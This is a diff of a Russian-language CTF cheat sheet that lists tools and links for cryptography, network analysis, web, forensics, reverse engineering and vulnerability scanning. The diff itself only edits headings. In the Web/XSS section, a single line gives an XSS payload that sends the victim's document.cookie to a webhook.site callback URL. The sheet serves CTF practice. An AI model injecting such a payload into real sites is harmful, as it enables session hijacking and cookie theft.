@@ -1,6 +1,6 @@
 ###### РЕКОМЕНДУЮ СТАВИТЬ КАЛИ ЛИНУКС И ЗАРАНЕЕ СТАВИТЬ ВСЁ ИЗ ВАШЕЙ КАТЕГОРИИ
 
-# Cryptography:
+# Cryptography
 - [dcode (france)](https://www.dcode.fr/rot-13-cipher)
   - расшифровка всего
   - вбиваете в поиск шифр и оно откроет решалку данного шифра
@@ -15,7 +15,7 @@
   - [Online 1](https://www.tunnelsup.com/hash-analyzer/)
   - [Online 2](https://hashes.com/en/tools/hash_identifier)
 
-# Network:
+# Network
 - [wireshark](https://www.wireshark.org/#download)
   - в основном для загрузки pcap файлов содержащих кучу сетевых пакетов
   - внимательно читайте задание и ищите то что говорят
@@ -25,7 +25,7 @@
   - подмена запросов и их отправка
   - и много других неизученых мною фич
 
-# Web:
+# Web
 #### XSS:
 - Использовать webhook.site для возвратного получения данных(callback)
 - <img src=x onerror=this.src='https://webhook.site/fad40d81-20a3-4ce9-9399-0c9a9a6e6a24/'+document.cookie;>
@@ -43,7 +43,7 @@
 - [cloudflare warp](https://1.1.1.1/)
   - впн от cloudflare 
 
-# Forensics:
+# Forensics
 - Дампы памяти (.mem файлы) 
   - HxD Hex Editor 
     - редактор сырых данных
@@ -59,7 +59,7 @@
 - Контейнеры 
   - Veracrypt, Truecrypt
 
-# Assembler:
+# Assembler
 
 
 - [Ida Decompiler](https://out7.hex-rays.com/files/idafree77_windows.exe)
@@ -74,7 +74,7 @@
   - ютубер, объясняет ассемблер
 
 
-# Vulnerability search:
+# Vulnerability search
 - [snyk-cli](https://docs.snyk.io/snyk-cli)
   - имбище(must have)
   - Ищет уязвимости в определенной папке.
